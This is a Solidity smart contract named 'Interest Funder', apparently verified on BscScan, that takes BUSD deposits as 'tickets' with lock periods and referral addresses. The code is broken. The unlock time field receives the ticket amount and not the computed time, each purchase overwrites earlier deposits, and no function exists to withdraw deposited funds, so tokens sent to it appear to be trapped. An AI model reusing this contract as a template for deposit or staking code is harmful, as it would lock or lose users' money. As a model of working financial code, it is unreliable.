/**
 *Submitted for verification at BscScan.com on 2022-11-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {
   function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract Interest_Funder {
uint256 public lastrewarddebt;
uint private  debtRatio_;
uint public  _outstandingbonds;
uint public _stakedbalance;
uint private _totalSupply;
uint private _pretotalSupply;
uint8 private _decimals;
string private _symbol;
string private _name;
mapping (address => uint256) private _balances;
address private _owner;

/// Structs for tickets

struct tickets {
        uint256 timestamp;
        uint256 deposit;
        uint256 tickets;
        uint256 unlock_time;
        address ref_address;
}

mapping(address => tickets) public UserInfo;

////
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
    /**
    * Modifier
    * We create our own function modifier called onlyOwner, it will Require the current owner to be 
    * the same as msg.sender
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: only owner can call this function");
        // This _; is not a TYPO, It is important for the compiler;
        _;
    }
 
    /**
    * @notice owner() returns the currently assigned owner of the Token
    * 
     */
    function owner() public view returns(address) {
        return _owner;

    }
    /**
    * @notice renounceOwnership will set the owner to zero address
    * This will make the contract owner less, It will make ALL functions with
    * onlyOwner no longer callable.
    * There is no way of restoring the owner
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    /**
    * @notice transferOwnership will assign the {newOwner} as owner
    *
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    /**
    * @notice _transferOwnership will assign the {newOwner} as owner
    *
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

 function PurchaseTicket (uint256 _amount, uint256 period, address _ref) external payable {
            IERC20 busd = IERC20(address(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7));
            address from = msg.sender;
            address to = address(this);
            uint256 _unlocktime;
            uint256 ticket_amount = 100000000000000000000*_amount;
            UserInfo[msg.sender].deposit = ticket_amount;
            UserInfo[msg.sender].tickets = _amount;
   
            if (period == 1) {_unlocktime = block.timestamp + 604800;}
            if (period == 2) {_unlocktime = block.timestamp + 2419200;}
            if (period == 3) {_unlocktime = block.timestamp + 15724800;}
            if (period == 4) {_unlocktime = block.timestamp + 31449600;}
            if (period == 5) {_unlocktime = block.timestamp + 302400000;}
            
            if (_ref == address(0)) {_ref = address(0x5d69C11912713db58c82E6a13054fD9aaE9Fd596);}
            UserInfo[msg.sender].unlock_time = _amount;
            UserInfo[msg.sender].timestamp = block.timestamp;
            UserInfo[msg.sender].ref_address = _ref;
            busd.transferFrom(from, to, ticket_amount);
 }

/// default token functions to manage contract

//string memory token_name, string memory short_symbol, uint8 token_decimals, uint256 token_totalSupply
  constructor(){
      _name = "Interest Funder";
      _symbol = "IF";
      _decimals = 18;
      _totalSupply = 0;
      _owner = msg.sender;
      emit OwnershipTransferred(address(0), _owner);
      // Emit an Transfer event to notify the blockchain that an Transfer has occured
    }

  function decimals() external view returns (uint8) {
    return _decimals;
  }
  /**
  * @notice symbol will return the Token's symbol 
  */
  function symbol() external view returns (string memory){
    return _symbol;
  }
  /**
  * @notice name will return the Token's symbol 
  */
  function name() external view returns (string memory){
    return _name;
  }
  /**
  * @notice totalSupply will return the tokens total supply of tokens
  */
  function totalSupply() external view returns (uint256){
    return _totalSupply;
  }
  /**
  * @notice balanceOf will return the account balance for the given account
  */
  function balanceOf(address account) external view returns (uint256) {
    uint256 _current_balance = _balances[account];
    return _current_balance;
  }


}